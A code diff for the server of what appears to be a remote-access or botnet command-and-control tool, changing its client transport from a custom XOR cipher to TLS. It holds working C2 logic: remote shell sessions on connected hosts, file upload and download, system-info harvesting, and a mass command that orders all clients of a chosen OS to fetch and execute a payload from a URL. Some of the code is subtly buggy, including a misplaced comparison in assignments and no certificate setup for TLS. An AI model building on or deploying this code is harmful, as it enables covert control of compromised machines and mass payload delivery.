@@ -12,9 +12,13 @@ void Server::mtxUnlock(){
 
 void Server::FreeClient(int iClientID){
 	if(Clients[iClientID] != nullptr){
+		if(Clients[iClientID]->sslSocket){
+			SSL_free(Clients[iClientID]->sslSocket);
+		}
+		close(Clients[iClientID]->sckSocket);
 		delete Clients[iClientID];
 		Clients[iClientID] = nullptr;
-		std::cout<<"memory released\n";
+		//std::cout<<"memory released\n";
 	}
 }
 
@@ -37,6 +41,7 @@ bool Server::SendFile(const std::string strRemoteFile, const std::string strLoca
 	u64 uBytesSent = 0;
 	int iBytes = 0;
 	int iBlockSize = 255;
+	int iLen = 0;
 	if(uFileSize == 0){
 		strmInputFile.close();
 		return false;
@@ -50,26 +55,31 @@ bool Server::SendFile(const std::string strRemoteFile, const std::string strLoca
 	strCmdLine.append(1, '@');
 	strCmdLine.append(3, 'A'); //junk to the end mayde randomize letters?
 	std::cout<<"Comand "<<strCmdLine<<'\n';
-	if(ssSendBinary(Clients[iClientID]->sckSocket, strCmdLine.c_str(), 0) > 0){
+	iLen = strCmdLine.length();
+	if(SSL_write(Clients[iClientID]->sslSocket, strCmdLine.c_str(), iLen) > 0){ 
+	//if(ssSendBinary(Clients[iClientID]->sckSocket, strCmdLine.c_str(), 0) > 0){
 		//sleep(1);
-		char *tmpBuffer = nullptr;
-		if(ssRecvBinary(Clients[iClientID]->sckSocket, tmpBuffer, 4) > 2){
+		//char *tmpBuffer = nullptr;
+		//if(ssRecvBinary(Clients[iClientID]->sckSocket, tmpBuffer, 4) > 2){
+		char tmpBuffer[4];
+		if(SSL_read(Clients[iClientID]->sslSocket, tmpBuffer, 3) > 2){
 			std::cout<<"Response "<<tmpBuffer<<'\n';
 			if(tmpBuffer[0] == 'f' && tmpBuffer[1] == '@' && tmpBuffer[2] == '1'){
 				std::cout<<"Received confirmation\n";
 			} else {
 				std::cout<<"Not confirmed, cancel transfer...\n";
 				strmInputFile.close();
-				Misc::Free(tmpBuffer, 0);
+				//Misc::Free(tmpBuffer, 0);
 				return false;
 			}
 		} else {
 			std::cout<<"Didnt receive confirmation from client\n";
 			error();
+			ERR_print_errors_fp(stderr);
 			strmInputFile.close();
-			Misc::Free(tmpBuffer, 0);
+			//Misc::Free(tmpBuffer, 0);
 		}
-		Misc::Free(tmpBuffer, 0);
+		//Misc::Free(tmpBuffer, 0);
 		char *cFileBuffer = nullptr;
 		cFileBuffer = new char[iBlockSize];
 		int iTmp = 0;
@@ -125,21 +135,24 @@ bool Server::DownloadFile(const std::string strRemoteFileName, int iClientID){
 	Misc::strReplaceSingleChar(cLocalName, ':', '-');
 	std::string strCmdLine = CommandCodes::cDownload;
 	strCmdLine.append(strRemoteFileName);
-	if(ssSendBinary(Clients[iClientID]->sckSocket, strCmdLine.c_str(), 0) > 0){
-		char *cFileSizeBuffer = nullptr;
+	int iLen = strCmdLine.length();
+	if(SSL_write(Clients[iClientID]->sslSocket, strCmdLine.c_str(), iLen) > 0){
+	//if(ssSendBinary(Clients[iClientID]->sckSocket, strCmdLine.c_str(), 0) > 0){
+		char cFileSizeBuffer[20];
 		u64 uTotalBytes = 0, uFinalSize = 0;
 		int iBytesRead = 0, iBufferSize = 255;
 		char *cFileBuffer = new char[iBufferSize];
-		if(ssRecvBinary(Clients[iClientID]->sckSocket, cFileSizeBuffer, 20) > 0){
+		if(SSL_read(Clients[iClientID]->sslSocket, cFileSizeBuffer, 19) > 0){
+		//if(ssRecvBinary(Clients[iClientID]->sckSocket, cFileSizeBuffer, 20) > 0){
 			if(strcmp(cFileSizeBuffer, CommandCodes::cFileTransferCancel) == 0){
 				std::cout<<"Unable to download remote file\n";
-				Misc::Free(cFileSizeBuffer, 0);
+				//Misc::Free(cFileSizeBuffer, 0);
 				return false;
 			}
 			tkToken = cFileSizeBuffer;
 			tkToken += 2;
 			sscanf(tkToken, "%llui", &uFinalSize);
-			Misc::Free(cFileSizeBuffer, 0);
+			//Misc::Free(cFileSizeBuffer, 0);
 			std::cout<<"File size is "<<uFinalSize<<'\n';
 			std::ofstream strmOutputFile(cLocalName, std::ios::binary);
 			if(!strmOutputFile.is_open()){
@@ -197,17 +210,17 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 					mtxUnlock();
 					std::string strCommandLine = CommandCodes::cShell;
 					strCommandLine.append(vcClientCommands[2]);
-					if(ssSendBinary(Clients[iClientID]->sckSocket, strCommandLine.c_str(), 0) > 0){
+					int iLen = strCommandLine.length();
+					if(SSL_write(Clients[iClientID]->sslSocket, strCommandLine.c_str(), iLen) > 0){
 						//receive confirmation that program is spawned
-						char *cConfirm = nullptr;
-						if(ssRecvBinary(Clients[iClientID]->sckSocket, cConfirm, 6) > 0){
+						char cConfirm[7];
+						if(SSL_read(Clients[iClientID]->sslSocket, cConfirm, 6) > 0){
 								std::cout<<"response "<<cConfirm<<'\n';
 								if(cConfirm[0] == 'x' && cConfirm[1] == '@' && cConfirm[2] == '1'){						
 									//spawn thread to receive output from shell           
 									isReadingShell = true;
 									std::thread thCmd(&Server::threadRemoteCmdOutput, this, iClientID);
 									char cCmdLine[512];
-									std::string strFinal = "";
 									int iStrLen = 0;
 									while(isReadingShell){
 										memset(cCmdLine, 0, 512);
@@ -215,9 +228,8 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 										if(Clients[iClientID] == nullptr){
 											break;
 										}
-										strFinal = ShellXor(std::string(cCmdLine), "password");
-										iStrLen = strFinal.length();
-										if(send(Clients[iClientID]->sckSocket, strFinal.c_str(), iStrLen, 0) <= 0){
+										iStrLen = strlen(cCmdLine);
+										if(SSL_write(Clients[iClientID]->sslSocket, cCmdLine, iStrLen) <= 0){
 											std::cout<<"Unable to send command to client\n";
 											error();
 											isReadingShell = false;
@@ -256,10 +268,12 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 			if(vcClientCommands.size() == 2){
 				if(vcClientCommands[1] == "-b"){
 					//basic information
-					char *cBufferInfo = nullptr;
-					if(ssSendBinary(Clients[iClientID]->sckSocket, CommandCodes::cReqBasicInfo, 0) > 0){
-						if(ssRecvBinary(Clients[iClientID]->sckSocket, cBufferInfo, 1024) > 0){
-							ParseBasicInfo(cBufferInfo, Clients[iClientID]->strOS == "Windows" ? 1 : 0);
+					char cBufferInfo[1024];
+					int iBytes = 0;
+					if(SSL_write(Clients[iClientID]->sslSocket, CommandCodes::cReqBasicInfo, 3) > 0){
+						if((iBytes = SSL_read(Clients[iClientID]->sslSocket, cBufferInfo, 1023) > 0)){
+							cBufferInfo[iBytes] = '\0';
+							//ParseBasicInfo(cBufferInfo, Clients[iClientID]->strOS == "Windows" ? 1 : 0);  fix this
 						} else {
 							std::cout<<"Unable to retrieve information from client\n";
 							error();
@@ -268,13 +282,13 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 						std::cout<<"Unable to send command to client\n";
 						error();
 					}
-					delete[] cBufferInfo;
-					cBufferInfo = nullptr;
 				} else if(vcClientCommands[1] == "-f"){
 					//full information
-					char *cBufferFullInfo = nullptr;
-					if(ssSendBinary(Clients[iClientID]->sckSocket, CommandCodes::cReqFullInfo, 0) > 0){
-						if(ssRecvBinary(Clients[iClientID]->sckSocket, cBufferFullInfo, 2048) > 0){
+					char cBufferFullInfo[2048];
+					int iBytes = 0;
+					if(SSL_write(Clients[iClientID]->sslSocket, CommandCodes::cReqFullInfo, 3) > 0){
+						if((iBytes = SSL_read(Clients[iClientID]->sslSocket, cBufferFullInfo, 2047) > 0)){
+							cBufferFullInfo[iBytes] = '\0';
 							//here parse full info depending wich os
 							//Clients[iClientID]->strOS == "Linux" ? parsefullinfolinux : parsefullinfowindows
 						} else {
@@ -285,8 +299,6 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 						std::cout<<"Unable to send command to client\n";
 						error();
 					}
-					delete[] cBufferFullInfo;
-					cBufferFullInfo = nullptr;
 				}
 			} else {
 				std::cout<<"\n\tUse info -b (Basic)  -f (Full)\n";
@@ -349,6 +361,7 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 				std::string strCommandLine = CommandCodes::cHttpd;
 				std::string strUrl = "";
 				u_char cExec;
+				int iLen = 0;
 				for(u_int iIt2 = 1; iIt2<5; iIt2+=2){
 					if(vcClientCommands[iIt2] == "-u"){
 						strUrl = vcClientCommands[iIt2+1];
@@ -363,7 +376,8 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 				strCommandLine.append(1, cExec);
 				strCommandLine.append(1, '@');
 				strCommandLine.append(3, 'A');
-				if(ssSendBinary(Clients[iClientID]->sckSocket, strCommandLine.c_str(), 0) > 0){
+				iLen = strCommandLine.length();
+				if(SSL_write(Clients[iClientID]->sslSocket, strCommandLine.c_str(), iLen) > 0){
 					std::cout<<"\n\tSent\n";
 				} else {
 					std::cout<<"Unable to send command to client\n";
@@ -492,13 +506,14 @@ void Server::ParseMassiveCommand(std::string strCommand){
 						strCmdLine.append(1, cExec);
 						strCmdLine.append(1, '@');
 						strCmdLine.append(strUrl);
+						int iLen = strCmdLine.length();
 						for(u_int iIt2=0; iIt2<Max_Clients; iIt2++){
 							if(Clients[iIt2] != nullptr){
 								if(Clients[iIt2]->strOS == strOS || strOS == "all"){
 									mtxLock();
 									Clients[iIt2]->isFlag = true;
 									mtxUnlock();
-									if(ssSendBinary(Clients[iIt2]->sckSocket, strCmdLine.c_str(), 0) > 0){
+									if(SSL_write(Clients[iIt2]->sslSocket, strCmdLine.c_str(), iLen) > 0){
 										std::cout<<"Client ["<<iIt2<<"] success\n";
 									} else {
 										std::cout<<"Client ["<<iIt2<<"] fail\n";
@@ -550,57 +565,6 @@ void Server::ParseBasicInfo(char*& cBuffer, int iOpt){
 	}	
 }
 
-int Server::ssSendStr(int sckSocket, const std::string& strMessage){
-	std::string strTmp = strCipher(strMessage);
-	int sBytes = strTmp.length();
-	int iBytes = send(sckSocket, strTmp.c_str(), sBytes, 0);
-	return iBytes;
-}
-
-int Server::ssRecvStr(int sckSocket, std::string& strOutput, int sBytes){
-	char *tmpData = new char[sBytes+1];
-	int iBytes = recv(sckSocket, tmpData, sBytes, 0);
-	if(iBytes <= 0){
-		return -1;
-	}
-	strOutput = strUnCipher(std::string(tmpData));
-	delete[] tmpData;
-	tmpData = nullptr;
-	return iBytes;
-}
-
-int Server::ssSendBinary(int sckSocket, const char* cData, int iBytes){
-	char *tmpData = nullptr;
-	BinaryCipher(cData, tmpData);
-	//Size not specified so calculate length of data to send
-	if(iBytes == 0){
-		iBytes = Misc::StrLen(tmpData);
-	}
-	int tBytes = send(sckSocket, tmpData, iBytes, 0);
-	delete[] tmpData;
-	tmpData = nullptr;
-	return tBytes;
-}
-	
-//delete memory of cOutput after use
-int Server::ssRecvBinary(int sckSocket, char*& cOutput, int sBytes){
-	char *cBuffer = new char[sBytes+1];
-	if(cBuffer == nullptr){
-		return -1;
-	}
-	int iBytes = recv(sckSocket, cBuffer, sBytes, 0);
-	if(iBytes <=0){
-		delete[] cBuffer;
-		cBuffer = nullptr;
-		return -1;
-	}
-	cBuffer[iBytes] = '\0';
-	cOutput = BinaryUnCipher((const char *)cBuffer);
-	delete[] cBuffer;
-	cBuffer = nullptr;
-	return iBytes;
-}
-
 bool Server::Listen(u_int uiMaxq){
 	int iStat = 0, iYes = 1;
 	const char *cLocalPort = std::string(std::to_string(uiLocalPort)).c_str();
@@ -637,6 +601,11 @@ bool Server::Listen(u_int uiMaxq){
 		return false;
 	}
 	if(sckMainSocket == -1 || strctP == nullptr){
+		return false;
+	}
+	sslCTX = SSL_CTX_new(TLS_server_method());
+	if(sslCTX == nullptr){
+		ERR_print_errors_fp(stderr);
 		return false;
 	}
 	return true;
@@ -703,18 +672,22 @@ void Server::threadListener(){
 				continue;
 			}
 			Clients[iClientCount]->sckSocket = dup(sckTMP);
-			
+			Clients[iClientCount]->sslSocket = SSL_new(sslCTX);
+			SSL_set_fd(Clients[iClientCount]->sslSocket, Clients[iClientCount]->sckSocket);
+			if(SSL_accept(Clients[iClientCount]->sslSocket) == -1){
+				FreeClient(iClientCount);
+				continue;
+			}
 			//request os to client
-			if(ssSendBinary(Clients[iClientCount]->sckSocket, CommandCodes::cReqOS, 0) > 0){
-				char *strTmpBuffer = nullptr;
-				int iBytes = ssRecvBinary(Clients[iClientCount]->sckSocket, strTmpBuffer, 20);
-				if(iBytes > 0 && Misc::StrLen(strTmpBuffer) >  0){
-					Clients[iClientCount]->strOS = strTmpBuffer[0] == '0' && strTmpBuffer[1] == '1' ? "Linux" : "Windows";
+			if(SSL_write(Clients[iClientCount]->sslSocket, CommandCodes::cReqOS, 3) > 0){
+				char cTmpBuffer[20];
+				int iBytes = SSL_read(Clients[iClientCount]->sslSocket, cTmpBuffer, 19);
+				if(iBytes > 0){
+					cTmpBuffer[iBytes] = '\0';
+					Clients[iClientCount]->strOS = cTmpBuffer[0] == '0' && cTmpBuffer[1] == '1' ? "Linux" : "Windows";
 				} else {
 					Clients[iClientCount]->strOS = "unkn0w";
 				}
-				delete[] strTmpBuffer;
-				strTmpBuffer = nullptr;
 			}
 			
 			//save obtained ip on client struct
@@ -792,9 +765,10 @@ void Server::threadMasterCMD(){
 						}while(strClientCmd != "exit");
 					}else if(strAction == "close"){ //close client conenction
  						if(Clients[iClientId] != nullptr && Clients[iClientId]->isConnected){
-							if(ssSendBinary(Clients[iClientId]->sckSocket,CommandCodes::cClose, 0) <= 0){
+							if(SSL_write(Clients[iClientId]->sslSocket, CommandCodes::cClose, 5) <= 0){
 								std::cout<<"Unable to send close command\n";
 								error();
+								ERR_print_errors_fp(stderr);
 							}
 						} else {
 							std::cout<<"Client ["<<iClientId<<"] doesn't exist or is not connected anymore\n";
@@ -867,13 +841,17 @@ void Server::threadMasterCMD(){
 
 void Server::threadClientPing(){
 	while(isCmdThread){
+		if(iClientsOnline == 0){
+			usleep(100000);
+			continue;
+		}
 		for(int iClientID = 0; iClientID<Max_Clients; iClientID++){
-			if(Clients[iClientID] != nullptr && Clients[iClientID]->isConnected){
+			if(Clients[iClientID] != nullptr){
 				if(Clients[iClientID]->isFlag){
 					sleep(2);
 					continue;
 				} else {
-					int iBytes = send(Clients[iClientID]->sckSocket, "", 1, 0);
+					int iBytes = SSL_write(Clients[iClientID]->sslSocket, "", 1);
 					if(iBytes != 1){
 						std::cout<<"Client["<<Clients[iClientID]->iID<<"] "<<Clients[iClientID]->strIP<<" disconnected\n";
 						mtxLock();
@@ -899,11 +877,10 @@ void Server::threadRemoteCmdOutput(int iClientID){
 	while(isReadingShell){
 		if(Clients[iClientID] != nullptr){
 			memset(cCmdBuffer, 0, 1024);
-			iBytes = recv(Clients[iClientID]->sckSocket, cCmdBuffer, 1024, 0);
+			iBytes = SSL_read(Clients[iClientID]->sslSocket, cCmdBuffer, 1023);
 			if(iBytes > 0){
-				strTmp = cCmdBuffer;
-				strCmdBuffer = ShellXor(strTmp, strPassword);
-				std::cout<<strCmdBuffer;
+				cCmdBuffer[iBytes] = '\0';
+				std::cout<<cCmdBuffer;
 			} else if(iBytes == -1){
 				std::cout<<"Socket error\n";
 				error();
